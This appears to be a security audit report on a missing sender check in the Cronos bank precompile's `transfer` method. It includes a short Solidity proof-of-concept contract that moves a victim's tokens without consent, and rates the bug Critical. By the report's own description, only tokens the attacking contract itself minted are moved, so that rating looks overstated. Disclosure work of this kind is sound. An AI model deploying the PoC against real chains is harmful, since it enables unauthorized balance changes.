### Title
Unauthorized Token Drain via Unvalidated `sender` Argument in Bank Precompile `transfer` — (`x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `TransferMethodName` handler in `BankContract.Run` accepts an arbitrary `sender` address from ABI-decoded calldata and passes it directly as the `from` argument to `bankKeeper.SendCoins`, without ever verifying that `sender == contract.Caller()`. Any contract can therefore drain `evm/<itself>` tokens from any victim address that holds them.

---

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `transfer` branch of `BankContract.Run`:

```
sender   := args[0].(common.Address)   // ← fully attacker-controlled ABI arg
recipient := args[1].(common.Address)
amount   := args[2].(*big.Int)
from := sdk.AccAddress(sender.Bytes())  // ← used as the debit account
denom := EVMDenom(contract.Caller())    // ← denom tied to calling contract
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

`sender` (line 175) is decoded from the raw calldata supplied by the calling contract. `denom` (line 186) is correctly anchored to `contract.Caller()`, so the token type is scoped to the calling contract. However, `from` (line 181) is set to the ABI-supplied `sender` with **no check** that it equals `contract.Caller()`. `bankKeeper.SendCoins` then debits that arbitrary address.

Compare with `mint`/`burn`: those methods also take an address from ABI args, but the semantics there are "the calling contract authorises a mint/burn for some recipient/holder" — the calling contract is the issuer. For `transfer`, the calling contract is claiming to authorise a debit from `sender`, which it has no right to do when `sender != contract.Caller()`. [2](#0-1) [3](#0-2) 

---

### Impact Explanation

**Critical — Unauthorized transfer of precompile-controlled assets.**

A malicious contract M can:
1. Call `IBankModule(0x64).mint(victim, N)` → victim now holds `N` units of `evm/<M>`.
2. Call `IBankModule(0x64).transfer(victim, attacker, N)` → `bankKeeper.SendCoins(from=victim, to=attacker, evm/<M>, N)` succeeds, draining victim's balance without any signature or approval from victim.

The victim's `evm/<M>` balance is debited and the attacker's is credited. This is an unauthorized balance change for precompile-controlled assets, matching the Critical impact category.

---

### Likelihood Explanation

- Requires no privileged access, no leaked keys, no governance action.
- The attacker is the deployer of contract M; any EOA can deploy a contract on Cronos.
- The only precondition is that the victim holds `evm/<M>` tokens, which the attacker can arrange by calling `mint` first (step 1 above).
- The exploit is a single EVM transaction (or two sequential ones) with no external dependencies.

---

### Recommendation

Enforce that the ABI-supplied `sender` equals `contract.Caller()` before executing the transfer:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)
    if sender != contract.Caller() {
        return nil, errors.New("sender must be the calling contract")
    }
    ...
``` [4](#0-3) 

Alternatively, remove the `sender` ABI argument entirely and always use `contract.Caller()` as `from`, consistent with how `mint`/`burn` use `contract.Caller()` for the denom authority.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract Exploit {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: give victim some evm/<this> tokens
    function setup(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain them back without victim's consent
    function drain(address victim, address attacker, uint256 amount) external {
        // sender arg = victim, but contract.Caller() = address(this)
        // denom = evm/<this>, from = victim → no authorization check
        bool ok = bank.transfer(victim, attacker, amount);
        require(ok, "drain failed");
    }
}
```

After `setup(victim, 1e18)`, calling `drain(victim, attacker, 1e18)` will move `1e18` units of `evm/<Exploit>` from `victim` to `attacker` with no transaction signed by `victim`. The root cause is the missing `sender == contract.Caller()` guard at line 175–181 of `x/cronos/keeper/precompiles/bank.go`. [5](#0-4)
